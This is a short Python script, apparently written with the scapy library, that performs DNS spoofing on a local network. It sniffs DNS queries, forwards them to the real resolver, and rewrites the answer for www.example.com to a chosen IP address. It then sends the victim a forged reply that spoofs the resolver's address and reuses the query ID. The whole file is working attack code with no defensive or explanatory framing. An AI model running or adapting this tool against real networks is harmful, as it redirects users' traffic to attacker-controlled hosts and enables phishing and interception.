from scapy.config import conf
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import sr1, sniff, send

interface = conf.iface
while True:
    p = sniff(count = 1, lfilter = lambda pac: DNS in pac and pac[DNS].qr == 0, iface = interface)
    p = p[0]
    print(f"[*] got a DNS request for {p[DNSQR].qname} from {p[IP].src}")
    s = IP(dst = p[IP].dst) /UDP(dport = p[UDP].dport) /DNS(qr =0, rd=1, qd=p[DNS].qd)
    dns_answer = sr1(s, timeout=2, verbose=False)

    if dns_answer:
        #r = IP(dst = p[IP].src, src = p[IP].dst) /UDP(sport = p[UDP].dport, dport = p[UDP].sport) /DNS(qr = 1, id = p[DNS].id, ra=1, qd=s[DNS].qd, an = dns_answer[DNS].an)
        #'''
        if DNS in dns_answer:
            ans =  dns_answer[DNS].an
        for answer in ans:
            if answer.type == 1:
                if b"www.example.com" in answer.rrname:
                    print(f"[*] got a DNS answer for {answer.rrname} is at {answer.rdata}")
                    answer.rdata = "100.160.51.123"
        r = IP(dst = p[IP].src, src = p[IP].dst) /UDP(sport = p[UDP].dport, dport = p[UDP].sport) /DNS(qr = 1, id = p[DNS].id, ra=1, qd=s[DNS].qd, an = ans, ar = dns_answer[DNS].ar, ns = dns_answer[DNS].ns)
        # '''
        send(r)
        if DNSRR in r:
            print(f"[*] sending a DNS answer for {r[DNSRR].rrname} is at {r[DNSRR].rdata}")

